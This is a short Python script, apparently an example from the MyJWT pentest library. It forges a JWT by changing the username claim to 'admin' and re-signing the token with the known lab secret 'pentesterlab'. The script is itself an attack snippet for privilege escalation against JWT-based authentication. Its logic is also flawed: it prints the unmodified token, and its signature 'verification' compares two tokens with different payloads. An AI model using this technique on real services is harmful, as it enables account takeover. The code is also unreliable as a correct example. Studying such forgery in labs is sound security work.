from MyJWT.modifyJWT import signature, changePayload
from MyJWT.utils import jwtToJson
from MyJWT.variables import VALID_SIGNATURE, INVALID_SIGNATURE

jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"
key = "pentesterlab"
# "header" = {"typ": "JWT", "alg": "HS256"}
# "payload" = {"username": null}
# "signature" = "Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"
jwtJson = jwtToJson(jwt)
jwtJson = changePayload(jwtJson, {"username": "admin"})
# "header" = {"typ": "JWT", "alg": "HS256"}
# "payload" = {"username": "admin"}
# "signature" = "Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"
newJwt = signature(jwtJson, key)
print(jwt)

# verify your jwt
print(
    VALID_SIGNATURE if newJwt.split(".")[2] == jwt.split(".")[2] else INVALID_SIGNATURE
)
